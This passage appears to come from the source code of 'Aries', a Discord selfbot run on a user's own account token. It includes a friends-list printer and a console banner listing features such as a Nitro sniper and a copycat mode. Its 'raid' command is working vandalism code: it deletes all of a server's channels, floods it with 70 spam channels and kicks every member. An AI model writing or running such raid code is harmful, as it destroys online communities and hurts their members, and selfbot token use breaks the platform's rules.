    await ctx.send(embed = embed) 
@bot.command()
async def friendslist(ctx):
    for user in bot.user.friends:    
         num = int(0.8)
         sleep(num)    
         print(user.name + f"#{user.discriminator}")
    msg_to_del = await ctx.send('Check Console / GUI!')
    sleep(5)
    await msg_to_del.delete()
    sleep(30)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "                                                  ___         _          ")
    print(Fore.CYAN + "                                                 /   |  _____(_)__  _____")
    print(Fore.CYAN + "                                                / /| | / ___/ / _ \/ ___/")
    print(Fore.CYAN + "                                               / ___ |/ /  / /  __(__  ) ")
    print(Fore.CYAN + "                                              /_/  |_/_/  /_/\___/____/  ")
    print(Fore.RESET + "\n\n                                             Ram the opposition with Aries")
    print("\n" + Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + command_amount + Fore.RESET + "Commands!")
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "User Is In » " + Fore.LIGHTCYAN_EX + str(len(bot.guilds))  + Fore.RESET + " Guilds!")
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Build » " + Fore.LIGHTCYAN_EX + version + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Prefix » " + Fore.LIGHTCYAN_EX + str(prefix) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Sniper » " + Fore.LIGHTCYAN_EX + str(nitro_sniper_config) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Selfbot Detector » " + Fore.LIGHTCYAN_EX + str(selfbot_detector_config) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Copycat » " + Fore.LIGHTCYAN_EX + str(copier) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.GREEN + " Connected! Enjoy Aries " + Fore.RESET + f"{bot.user}" + Fore.RESET)     
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.BLUE + " (Please Note that your token is safe and is only stored in a json file) " + Fore.RESET)
@bot.command()
async def raid(ctx):
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    try:
     for c in ctx.guild.channels:
        await c.delete()
    except commands.MissingPermissions:
        print("No Permission To RAID")

    try:
        guild = ctx.guild
        for i in range(70):
         await guild.create_text_channel("Aries on TOP")
        members = ctx.guild.members
        members.remove(ctx.me)
        for member in members:
         await member.kick(reason = "RAIDED")
        print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+] " + "Successfully Raided " + Fore.RESET + f"{ctx.guild}!")
        sleep(5)
        ctx.guild.leave
    except commands.MissingPermissions:
        print("No Permission To RAID")


# ///////////////////////////////////////////////////////////////
# Main Load
if (os.path.exists("./data/config.json")):
    pass
else:
    files.setup()
def bot_login():
    """Log in the bot"""
    try:
        with open("./data/config.json") as f:
            config = json.load(f)
        token = config.get('token')
        bot.run(token)
    except Exception as e:
        print(e)
aries.console(clear=True, line=True)
print("Loading...")
bot_login()
ready = True